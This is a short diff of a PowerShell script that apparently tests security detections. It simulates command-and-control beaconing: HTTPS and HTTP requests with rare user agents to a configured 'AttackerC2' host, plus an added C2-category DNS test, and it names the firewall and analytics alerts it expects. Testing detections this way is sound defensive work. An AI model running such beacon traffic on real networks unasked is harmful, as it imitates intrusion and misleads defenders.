@@ -27,4 +27,5 @@ foreach ($ua in $uas) {
     Invoke-Http -Url "https://$($cfg.AttackerC2)/tls-beacon" -UserAgent $ua -Label "rare TLS+UA"
     Invoke-Http -Url "http://$($cfg.AttackerC2)/tls-beacon"  -UserAgent $ua -Label "rare UA (http fallback)"
 }
-Write-Stage "STAGE 4 done. Expect EAL: 'Abnormal ... rare combination of TLS and HTTP User Agent' (rule 7f213d7d)." "OK"
+Invoke-TestDns -Category "c2"
+Write-Stage "STAGE 4 done. Expect FW NGFW: DNS-Security C2 + (once baselined) EAL 'Abnormal rare TLS+UA' 7f213d7d." "OK"
